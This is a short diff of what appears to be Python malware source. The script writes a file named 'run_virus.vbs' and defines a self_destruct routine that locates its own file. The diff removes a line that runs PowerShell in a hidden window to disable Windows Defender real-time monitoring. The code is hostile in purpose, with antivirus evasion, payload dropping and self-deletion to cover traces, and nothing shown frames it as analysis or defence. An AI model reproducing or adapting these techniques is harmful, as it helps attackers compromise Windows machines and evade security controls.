@@ -1,8 +1,7 @@
 import os
 import subprocess
 import sys
-cmd = ["cmd.exe","/c",'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"']
-subprocess.Popen(cmd,creationflags=0x08000000,)
+
 
 def self_destruct():
     current_file = os.path.abspath(sys.argv[0])
@@ -50,4 +49,5 @@ with open("run_virus.vbs","w") as f:
     f.write(content_vbs)
 
 os.chdir(pwd)
+
 self_destruct()
